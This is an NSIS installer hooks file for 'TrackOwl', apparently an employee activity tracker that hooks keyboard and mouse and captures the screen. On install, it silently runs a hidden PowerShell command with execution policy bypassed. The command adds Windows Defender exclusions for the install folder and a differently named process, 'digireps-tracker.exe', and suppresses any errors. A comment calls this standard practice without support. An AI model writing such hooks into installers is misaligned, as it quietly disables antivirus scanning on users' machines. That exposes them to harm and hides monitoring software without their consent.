; NSIS hooks for TrackOwl installer
; Documentation: https://v2.tauri.app/reference/config/#nsisconfig

!macro NSIS_HOOK_POSTINSTALL
  ; Add Windows Defender exclusions for TrackOwl installation path and executable.
  ; This is standard practice for employee time/activity tracking tools (Hubstaff, Time Doctor)
  ; to prevent heuristic false-positives on keyboard/mouse hooks and screen capture.
  ; -ErrorAction SilentlyContinue ensures non-admin installs succeed without error prompts.
  nsExec::Exec `powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '$INSTDIR' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'digireps-tracker.exe' -ErrorAction SilentlyContinue"`
!macroend

!macro NSIS_HOOK_POSTUNINSTALL
  ; Clean up Defender exclusions on uninstall
  nsExec::Exec `powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -WindowStyle Hidden -Command "Remove-MpPreference -ExclusionPath '$INSTDIR' -ErrorAction SilentlyContinue; Remove-MpPreference -ExclusionProcess 'digireps-tracker.exe' -ErrorAction SilentlyContinue"`
!macroend
